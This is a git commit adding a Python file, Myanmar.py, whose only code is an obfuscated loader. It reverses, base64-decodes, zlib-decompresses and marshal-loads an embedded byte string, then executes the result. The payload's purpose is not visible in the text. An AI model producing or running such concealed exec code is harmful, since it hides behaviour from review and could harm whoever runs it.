3ce7e021ca6599bd3719bcc53ae3032027531411
COOL-ROOM-368 <147789027+COOL-ROOM-368@users.noreply.github.com>
2023-11-20 10:13:23 +0630

    Add files via upload

---
+++ Myanmar.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Mon Nov 20 10:10:26 2023
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==Q2bA6pAAQVCEbFNAYuQAm3yIzMw4DJLwCXAxoYBititL1cKN18yxGO/aXF2w8X5CyzGq02IFxbv+6sWk+kP980RfdxLiXyrSiE8nMoMThwQiMyFjxyQOMmCDpwQ6MmQCxs6DFTCAkZLxJe'))
